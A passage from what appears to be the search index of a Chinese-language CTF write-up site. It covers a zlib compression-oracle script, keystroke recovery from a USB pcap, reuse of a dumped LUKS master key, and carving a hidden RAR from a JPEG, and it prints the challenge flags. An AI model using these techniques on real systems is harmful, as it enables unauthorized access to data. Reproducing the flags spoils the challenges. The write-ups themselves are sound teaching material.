'A' ), ord ( 'Z' ) + 1 ): conn . send ( f ' { d [ k ] } : { chr ( c ) * 4 } \\n ' ) l = int ( conn . recvline_contains ( 'zlib' ) . split ( b ' ' )[ - 1 ]) if l < min : min , mic = l , chr ( c ) flag [ flag_pos . find ( chr ( k ))] = mic print ( '' . join ( flag )) # DrgnS{THISISACRIMEIGUESS}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/compress_the_flag/#_3","text":"bzip2 - Wikipedia zlib - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/difficult_programming_language/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u6253\u5f00\u719f\u6089\u7684 pcap \u6587\u4ef6\u4e00\u770b\uff0c\u770b\u5230\u4e86\u964c\u751f\u7684 USB \u534f\u8bae\uff0c\u767b\u65f6\u50bb\u773c(\u309c-\u309c) \u901a\u8fc7\u641c\u7d22\u4e86\u89e3\u5230 USB \u534f\u8bae\u4e2d\u7684\u6570\u636e\u5305\u542b\u5728 Leftover Capture Data \u5b57\u6bb5\u4e2d\uff0c\u9f20\u6807\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(4\\) \u4e2a\u5b57\u8282\uff0c\u952e\u76d8\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(8\\) \u4e2a\u5b57\u8282 \u7531\u6570\u636e\u957f\u5ea6\u53ef\u4ee5\u5224\u65ad\uff0c\u7531\u9898\u76ee\u7ed9\u51fa\u7684 pcap \u6587\u4ef6\u53ef\u4ee5\u6062\u590d\u51fa\u952e\u76d8\u7684\u6309\u952e\u4fe1\u606f\u5495\uff0c\u5176\u4e2d\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c \\(3\\) \u4e2a\u5b57\u8282 \u5c06\u7b2c\u4e09\u5b57\u8282\u53d6\u51fa\u6765\uff0c\u5bf9\u7167\u6620\u5c04\u8868\u5f97\u5230\u51fb\u952e\u5e8f\u5217 USB KEYBOARD \u7684\u6620\u5c04\u8868\uff0c \u5b8c\u6574\u5bf9\u7167\u8868 - USB HID usage table XD \u5077\u4e2a\u61d2\u5495\uff0c\u76f4\u63a5\u4f7f\u7528\u73b0\u6709\u7684 UsbKeyboardDataHacker.py \u8fdb\u884c\u51fb\u952e\u5e8f\u5217\u7684\u63d0\u53d6\uff08\u9700\u8981\u4e0b\u8f7d tshark \uff0c\u7528\u4e8e Leftover Capture Data \u5b57\u6bb5\u4fe1\u606f\u7684\u63d0\u53d6\uff09 \u63d0\u53d6\u540e\u5f97\u5230\u4e86\u8fd9\u4e48\u4e2a\u73a9\u610f\uff08?\uff09\uff1a 1 D'`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\\a`_X|V[Tx;\"VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~ <GA> \u4e3a Grave Accent\uff0c\u662f ~ \u6240\u5728\u6309\u952e\uff0c\u5c06 normalKeys \u7684 <GA> \u66ff\u6362\u4e3a ` \uff0c\u5c06 shiftKeys \u7684 <GA> \u66ff\u6362\u4e3a ~ \u9898\u76ee\u53eb Difficult Programming Language \uff0c\u6240\u4ee5\u662f\u67d0\u79cd\u8bed\u8a00\u54af\uff1f \u770b\u4e86\u522b\u4eba\u7684 WP\uff0c\u4e86\u89e3\u5230\u8fd9\u662f Malbolge \u6240\u7f16\u5199\u7684\u7a0b\u5e8f\uff08\u4e0d\u77e5\u9053\u522b\u4eba\u600e\u4e48\u7528\u5495\u679c\u641c\u5230\u7684\uff0c\u53cd\u6b63\u6211\u53ea\u641c\u5230\u4e86 WP 23333\uff09 \u627e\u4e2a Malbolge \u5728\u7ebf\u8c03\u8bd5\u5668 \uff0c\u628a\u4ee3\u7801\u4e22\u8fdb\u53bb\uff0c\u53d1\u73b0\u2014\u2014\u2014\u8fd9\u4ee3\u7801\u7adf\u7136\u8fd8\u6572\u9519\u4e86\uff08\u256f\u2035\u25a1\u2032\uff09\u256f\ufe35\u2534\u2500\u2534 \u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u628a \" \u6539\u6210 : \u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86\uff0c\u8fd0\u884c\u540e\u5f97\u5230 FLAG\uff1a hctf{m4lb0lGe} \u76f8\u5173\u6269\u5c55 \u00b6 \u9f20\u6807\u534f\u8bae \u00b6 \u9f20\u6807\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(4\\) \u4e2a\u5b57\u8282 \u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c0x00 \u8868\u793a\u672a\u6309\u952e\uff0c0x01 \u8868\u793a\u6572\u51fb\u5de6\u952e\uff0c0x02 \u8868\u793a\u6572\u51fb\u53f3\u952e \u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u88ab\u770b\u4f5c\u7b26\u53f7\u4f4d\u3002\u503c\u4e3a\u6b63\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6c34\u5e73\u5411\u53f3\u79fb\u52a8\uff1b\u503c\u4e3a\u8d1f\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6c34\u5e73\u5411\u5de6\u79fb\u52a8 \u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u76f8\u4f3c\uff0c\u7528\u4e8e\u63cf\u8ff0\u9f20\u6807\u5782\u76f4\u65b9\u5411\u7684\u79fb\u52a8 \u4f7f\u7528 UsbMiceDataHacker.py \u7ed8\u5236\u9f20\u6807\u79fb\u52a8\u53ca\u62d6\u52a8\u8f68\u8ff9 \u53c2\u8003\u8d44\u6599 \u00b6 USB - CTF Wiki Malbolge \u2013 lutter.cc","title":"Difficult Programming Language"},{"location":"misc/difficult_programming_language/#_1","text":"\u6253\u5f00\u719f\u6089\u7684 pcap \u6587\u4ef6\u4e00\u770b\uff0c\u770b\u5230\u4e86\u964c\u751f\u7684 USB \u534f\u8bae\uff0c\u767b\u65f6\u50bb\u773c(\u309c-\u309c) \u901a\u8fc7\u641c\u7d22\u4e86\u89e3\u5230 USB \u534f\u8bae\u4e2d\u7684\u6570\u636e\u5305\u542b\u5728 Leftover Capture Data \u5b57\u6bb5\u4e2d\uff0c\u9f20\u6807\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(4\\) \u4e2a\u5b57\u8282\uff0c\u952e\u76d8\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(8\\) \u4e2a\u5b57\u8282 \u7531\u6570\u636e\u957f\u5ea6\u53ef\u4ee5\u5224\u65ad\uff0c\u7531\u9898\u76ee\u7ed9\u51fa\u7684 pcap \u6587\u4ef6\u53ef\u4ee5\u6062\u590d\u51fa\u952e\u76d8\u7684\u6309\u952e\u4fe1\u606f\u5495\uff0c\u5176\u4e2d\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c \\(3\\) \u4e2a\u5b57\u8282 \u5c06\u7b2c\u4e09\u5b57\u8282\u53d6\u51fa\u6765\uff0c\u5bf9\u7167\u6620\u5c04\u8868\u5f97\u5230\u51fb\u952e\u5e8f\u5217 USB KEYBOARD \u7684\u6620\u5c04\u8868\uff0c \u5b8c\u6574\u5bf9\u7167\u8868 - USB HID usage table XD \u5077\u4e2a\u61d2\u5495\uff0c\u76f4\u63a5\u4f7f\u7528\u73b0\u6709\u7684 UsbKeyboardDataHacker.py \u8fdb\u884c\u51fb\u952e\u5e8f\u5217\u7684\u63d0\u53d6\uff08\u9700\u8981\u4e0b\u8f7d tshark \uff0c\u7528\u4e8e Leftover Capture Data \u5b57\u6bb5\u4fe1\u606f\u7684\u63d0\u53d6\uff09 \u63d0\u53d6\u540e\u5f97\u5230\u4e86\u8fd9\u4e48\u4e2a\u73a9\u610f\uff08?\uff09\uff1a 1 D'`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\\a`_X|V[Tx;\"VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~ <GA> \u4e3a Grave Accent\uff0c\u662f ~ \u6240\u5728\u6309\u952e\uff0c\u5c06 normalKeys \u7684 <GA> \u66ff\u6362\u4e3a ` \uff0c\u5c06 shiftKeys \u7684 <GA> \u66ff\u6362\u4e3a ~ \u9898\u76ee\u53eb Difficult Programming Language \uff0c\u6240\u4ee5\u662f\u67d0\u79cd\u8bed\u8a00\u54af\uff1f \u770b\u4e86\u522b\u4eba\u7684 WP\uff0c\u4e86\u89e3\u5230\u8fd9\u662f Malbolge \u6240\u7f16\u5199\u7684\u7a0b\u5e8f\uff08\u4e0d\u77e5\u9053\u522b\u4eba\u600e\u4e48\u7528\u5495\u679c\u641c\u5230\u7684\uff0c\u53cd\u6b63\u6211\u53ea\u641c\u5230\u4e86 WP 23333\uff09 \u627e\u4e2a Malbolge \u5728\u7ebf\u8c03\u8bd5\u5668 \uff0c\u628a\u4ee3\u7801\u4e22\u8fdb\u53bb\uff0c\u53d1\u73b0\u2014\u2014\u2014\u8fd9\u4ee3\u7801\u7adf\u7136\u8fd8\u6572\u9519\u4e86\uff08\u256f\u2035\u25a1\u2032\uff09\u256f\ufe35\u2534\u2500\u2534 \u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u628a \" \u6539\u6210 : \u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86\uff0c\u8fd0\u884c\u540e\u5f97\u5230 FLAG\uff1a hctf{m4lb0lGe}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/difficult_programming_language/#_2","text":"","title":"\u76f8\u5173\u6269\u5c55"},{"location":"misc/difficult_programming_language/#_3","text":"\u9f20\u6807\u534f\u8bae\u7684\u6570\u636e\u957f\u5ea6\u4e3a \\(4\\) \u4e2a\u5b57\u8282 \u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c0x00 \u8868\u793a\u672a\u6309\u952e\uff0c0x01 \u8868\u793a\u6572\u51fb\u5de6\u952e\uff0c0x02 \u8868\u793a\u6572\u51fb\u53f3\u952e \u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u88ab\u770b\u4f5c\u7b26\u53f7\u4f4d\u3002\u503c\u4e3a\u6b63\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6c34\u5e73\u5411\u53f3\u79fb\u52a8\uff1b\u503c\u4e3a\u8d1f\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6c34\u5e73\u5411\u5de6\u79fb\u52a8 \u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u76f8\u4f3c\uff0c\u7528\u4e8e\u63cf\u8ff0\u9f20\u6807\u5782\u76f4\u65b9\u5411\u7684\u79fb\u52a8 \u4f7f\u7528 UsbMiceDataHacker.py \u7ed8\u5236\u9f20\u6807\u79fb\u52a8\u53ca\u62d6\u52a8\u8f68\u8ff9","title":"\u9f20\u6807\u534f\u8bae"},{"location":"misc/difficult_programming_language/#_4","text":"USB - CTF Wiki Malbolge \u2013 lutter.cc","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/encrypted_u_disk/","text":"\u9898\u76ee \u00b6 \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123 \u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d LUKS - \u6280\u672f\u7279\u70b9 \u00b6 \u91c7\u7528\u4e00\u79cd\u6570\u636e\u5206\u5272\u6280\u672f\u4fdd\u5b58\u52a0\u5bc6\u5bc6\u94a5\uff0c\u4fdd\u8bc1\u5bc6\u94a5\u7684\u5b89\u5168\u6027 \u652f\u6301\u591a\u7528\u6237/\u5bc6\u7801\u5bf9\u540c\u4e00\u4e2a\u8bbe\u5907\u7684\u8bbf\u95ee\uff0c\u7528\u6237\u5bc6\u7801\u52a0\u5bc6\u4e3b\u5bc6\u94a5 \u7531 Split Master Key \u53ef\u4ee5\u5f97\u5230 Master Key \u6570\u636e\u52a0\u5bc6\u5bc6\u94a5\uff0c\u5373\u4e3b\u5bc6\u94a5\uff0c\u4e0d\u4f9d\u8d56\u5bc6\u7801\uff0c \u6539\u53d8\u5bc6\u7801\u65e0\u9700\u91cd\u65b0\u52a0\u5bc6\u6570\u636e \u89e3\u9898\u601d\u8def \u00b6 \u7b2c\u4e00\u5929\u548c\u7b2c\u4e8c\u5929\u5206\u522b\u5bf9\u5e94\u955c\u50cf day1.img \u548c day2.img \u7531\u9898\u610f\u53ef\u77e5\uff0c\u4ece day1.img \u5230 day2.img \u53ea\u6709\u7528\u6237\u5bc6\u7801\u53d1\u751f\u4e86\u53d8\u66f4\uff0c\u52a0\u5bc6\u6570\u636e\u4f7f\u7528\u7684\u4e3b\u5bc6\u94a5\u5e76\u6ca1\u6709\u53d8\u5316 Ubuntu \u53cc\u51fb\u540e\u8f93\u5165\u5bc6\u7801\uff0c\u76f4\u63a5\u6302\u8f7d day1.img \uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709 Flag (\u014f\u03c9\u014f)\uff0c\u5feb\u8fdb\u5230\u4e0b\u4e00\u6b65 \u6216\u8005\u901a\u8fc7\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u6302\u8f7d 1 2 3 sudo losetup -P /dev/loop23 day1.img # -P\uff1a\u5f3a\u5236\u5185\u6838\u626b\u63cf\u65b0\u5efa\u56de\u73af\u8bbe\u5907\u4e0a\u7684\u5206\u533a\u8868\uff0c\u5426\u5219 cryptsetup \u65e0\u6cd5\u8bc6\u522b\u4e3a\u6709\u6548\u7684 LUKS \u8bbe\u5907 sudo cryptsetup luksOpen /dev/loop23p1 day1 \u83b7\u53d6 LUKS \u52a0\u5bc6\u955c\u50cf\u6302\u8f7d\u7684\u4f4d\u7f6e 1 2 3 4 $ lsblk | grep luks -B 2 loop23 7 :23 0 20M 1 loop \u2514\u2500loop23p1 259 :10 0 19M 1 part \u2514\u2500luks-e9a660d5-4a91-4dca-bda5-3f6a49eea998 253 :0 0 3M 1 crypt /media/yanhui/My Disk \u83b7\u53d6\u4e3b\u5bc6\u94a5\u5e76\u4fdd\u5b58\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ sudo cryptsetup luksDump --dump-master-key /dev/loop23p1 WARNING! ======== Header dump with volume key is sensitive information which allows access to an encrypted partition without a passphrase. This dump should be always stored encrypted in a safe place. Are you sure? ( Type uppercase yes ) : YES Enter passphrase for /dev/loop23p1: LUKS header information for /dev/loop23p1 Cipher name: aes Cipher mode: xts-plain64 Payload offset: 32768 UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 MK bits: 512 MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ echo \"be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a\" | tr -d \" \" | xxd -r -p > masterkey \u4f7f\u7528\u4e3b\u5bc6\u94a5\u89e3\u5bc6 day2.img 1 2 sudo losetup -P /dev/loop24 day2.img sudo cryptsetup luksOpen /dev/loop24p1 day2 --master-key-file masterkey \u8fdb\u5165\u78c1\u76d8\uff0c\u5c31\u80fd\u770b\u5230 flag.txt \u4e86 Flag \u00b6 flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key} \u53c2\u8003\u8d44\u6599 \u00b6 \u94b1\u955c\u6d01\uff0c\u9b4f\u9e4f\uff0c\u6c88\u957f\u8fbe. LUKS\u52a0\u5bc6\u5377\u7684\u79bb\u7ebf\u89e3\u5bc6\u6280\u672f\u5206\u6790 [J]. \u4fe1\u606f\u7f51\u7edc\u5b89\u5168, 2014, 14(9): 217-219. losetup(8) \u2014 Linux manual page cryptsetup(8) \u2014 Linux manual page","title":"\u52a0\u5bc6\u7684 U \u76d8"},{"location":"misc/encrypted_u_disk/#_1","text":"\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123 \u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d","title":"\u9898\u76ee"},{"location":"misc/encrypted_u_disk/#luks-","text":"\u91c7\u7528\u4e00\u79cd\u6570\u636e\u5206\u5272\u6280\u672f\u4fdd\u5b58\u52a0\u5bc6\u5bc6\u94a5\uff0c\u4fdd\u8bc1\u5bc6\u94a5\u7684\u5b89\u5168\u6027 \u652f\u6301\u591a\u7528\u6237/\u5bc6\u7801\u5bf9\u540c\u4e00\u4e2a\u8bbe\u5907\u7684\u8bbf\u95ee\uff0c\u7528\u6237\u5bc6\u7801\u52a0\u5bc6\u4e3b\u5bc6\u94a5 \u7531 Split Master Key \u53ef\u4ee5\u5f97\u5230 Master Key \u6570\u636e\u52a0\u5bc6\u5bc6\u94a5\uff0c\u5373\u4e3b\u5bc6\u94a5\uff0c\u4e0d\u4f9d\u8d56\u5bc6\u7801\uff0c \u6539\u53d8\u5bc6\u7801\u65e0\u9700\u91cd\u65b0\u52a0\u5bc6\u6570\u636e","title":"LUKS - \u6280\u672f\u7279\u70b9"},{"location":"misc/encrypted_u_disk/#_2","text":"\u7b2c\u4e00\u5929\u548c\u7b2c\u4e8c\u5929\u5206\u522b\u5bf9\u5e94\u955c\u50cf day1.img \u548c day2.img \u7531\u9898\u610f\u53ef\u77e5\uff0c\u4ece day1.img \u5230 day2.img \u53ea\u6709\u7528\u6237\u5bc6\u7801\u53d1\u751f\u4e86\u53d8\u66f4\uff0c\u52a0\u5bc6\u6570\u636e\u4f7f\u7528\u7684\u4e3b\u5bc6\u94a5\u5e76\u6ca1\u6709\u53d8\u5316 Ubuntu \u53cc\u51fb\u540e\u8f93\u5165\u5bc6\u7801\uff0c\u76f4\u63a5\u6302\u8f7d day1.img \uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709 Flag (\u014f\u03c9\u014f)\uff0c\u5feb\u8fdb\u5230\u4e0b\u4e00\u6b65 \u6216\u8005\u901a\u8fc7\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u6302\u8f7d 1 2 3 sudo losetup -P /dev/loop23 day1.img # -P\uff1a\u5f3a\u5236\u5185\u6838\u626b\u63cf\u65b0\u5efa\u56de\u73af\u8bbe\u5907\u4e0a\u7684\u5206\u533a\u8868\uff0c\u5426\u5219 cryptsetup \u65e0\u6cd5\u8bc6\u522b\u4e3a\u6709\u6548\u7684 LUKS \u8bbe\u5907 sudo cryptsetup luksOpen /dev/loop23p1 day1 \u83b7\u53d6 LUKS \u52a0\u5bc6\u955c\u50cf\u6302\u8f7d\u7684\u4f4d\u7f6e 1 2 3 4 $ lsblk | grep luks -B 2 loop23 7 :23 0 20M 1 loop \u2514\u2500loop23p1 259 :10 0 19M 1 part \u2514\u2500luks-e9a660d5-4a91-4dca-bda5-3f6a49eea998 253 :0 0 3M 1 crypt /media/yanhui/My Disk \u83b7\u53d6\u4e3b\u5bc6\u94a5\u5e76\u4fdd\u5b58\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ sudo cryptsetup luksDump --dump-master-key /dev/loop23p1 WARNING! ======== Header dump with volume key is sensitive information which allows access to an encrypted partition without a passphrase. This dump should be always stored encrypted in a safe place. Are you sure? ( Type uppercase yes ) : YES Enter passphrase for /dev/loop23p1: LUKS header information for /dev/loop23p1 Cipher name: aes Cipher mode: xts-plain64 Payload offset: 32768 UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 MK bits: 512 MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ echo \"be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a\" | tr -d \" \" | xxd -r -p > masterkey \u4f7f\u7528\u4e3b\u5bc6\u94a5\u89e3\u5bc6 day2.img 1 2 sudo losetup -P /dev/loop24 day2.img sudo cryptsetup luksOpen /dev/loop24p1 day2 --master-key-file masterkey \u8fdb\u5165\u78c1\u76d8\uff0c\u5c31\u80fd\u770b\u5230 flag.txt \u4e86","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/encrypted_u_disk/#flag","text":"flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key}","title":"Flag"},{"location":"misc/encrypted_u_disk/#_3","text":"\u94b1\u955c\u6d01\uff0c\u9b4f\u9e4f\uff0c\u6c88\u957f\u8fbe. LUKS\u52a0\u5bc6\u5377\u7684\u79bb\u7ebf\u89e3\u5bc6\u6280\u672f\u5206\u6790 [J]. \u4fe1\u606f\u7f51\u7edc\u5b89\u5168, 2014, 14(9): 217-219. losetup(8) \u2014 Linux manual page cryptsetup(8) \u2014 Linux manual page","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/gakki/","text":"\u89e3\u9898\u601d\u8def \u00b6 emm\u2026\u2026\u662f\u4e00\u5f20\u65b0\u57a3\u7ed3\u8863\u7684\u7167\u7247\u3010\u4e0d\u662f\u91cd\u70b9\uff01(\u03a6\u76bf\u03a6\u256c)\u3011\u770b\u770b\u6709\u6ca1\u6709\u85cf\u2026\u2026\u6709\u7684\uff01\u7528 dd \u5206\u79bb\u51fa\u6765~ 1 2 3 4 5 6 7 8 9 10 11 12 $ binwalk wolaopo.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 137448 0x218E8 RAR archive data, first volume type: MAIN_HEAD $ dd if = wolaopo.jpg of = tmp.rar skip = 137448 bs = 1 79776 +0 records in 79776 +0 records out 79776 bytes ( 80 kB, 78 KiB ) copied, 1 .73609 s, 46 .0 kB/s \u5206\u79bb\u51fa\u6765\u7684\u538b\u7f29\u6587\u4ef6\u9700\u8981\u8f93\u5165\u5bc6\u7801\u89e3\u538b\uff0c\u7206\u7834\u83b7\u5f97\u5bc6\u7801 8864 \u89e3\u538b\u540e\u5f97\u5230\u6587\u4ef6 flag.txt \uff0c\u6587\u4ef6\u5185\u5bb9\u2026\u2026\u662f\u4e2a\u5565\uff1f\uff1f \u8d77\u521d\u731c\u6d4b\u662f\u67d0\u79cd\u7279\u6b8a\u7684\u7f16\u7801\uff0c\u5495\u679c\u65e0\u679c\u2026\u2026\u7adf\u7136\u662f\u7edf\u8ba1\u5b57\uff08\u7b26\uff09\u9891\uff01\u3010\u5b8c\u5168\u6ca1\u60f3\u5230\u3011 1 2 3 4 5 6 7 8 9 10 11 12 13 14 f = open ( 'flag.txt' , 'r' ) content = f . read () f . close () cnt = dict () for i in content : if ( i == ' \\n ' ): continue if i in cnt : cnt [ i ] += 1 else : cnt [ i ] = 1 ans = { k : v for k , v in sorted ( cnt . items (), key = lambda item : item [ 1 ], reverse = True )} for i in ans : print ( i , end = '' ) \u7edf\u8ba1\u5b8c\u540e\uff0c\u6309\u9891\u7387\u4ece\u9ad8\u5230\u4f4e\u6392\u5217\uff0c\u6210\u529f\u83b7\u53d6 flag\uff01 1 2 $ python3 gakki.py GXY { gaki_IsMyw1fe } 